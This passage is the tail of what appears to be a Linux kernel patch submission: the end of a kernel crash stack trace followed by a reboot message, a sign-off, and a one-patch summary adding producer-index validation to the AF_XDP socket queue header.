[  593.316379][    C0]  NF_HOOK.constprop.0+0x1f4/0x2e0
[  593.320541][    C0]  mld_sendpack+0x5bf/0xa40
[  593.321756][    C0]  __lock_acquire.isra.0+0x5cb/0x1230
[  593.322191][    C0]  mld_ifc_work+0x499/0xb40
[  593.323741][    C0]  process_one_work+0x80f/0x1680
[  593.324921][    C0]  worker_thread+0x618/0x1140
[  593.328619][    C0]  kthread+0x2bd/0x3a0
[  593.329659][    C0]  ret_from_fork+0x31/0x70
[  593.330303][    C0]  ret_from_fork_asm+0x1a/0x30
[  593.330654][    C0]  </TASK>
[  594.382053][    C0] Shutting down cpus with NMI
[  594.382738][    C0] Kernel Offset: disabled
[  594.383045][    C0] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou


Zhiling Zou (1):
  xsk: validate consumer ring producer index

 net/xdp/xsk_queue.h | 3 +++
 1 file changed, 3 insertions(+)

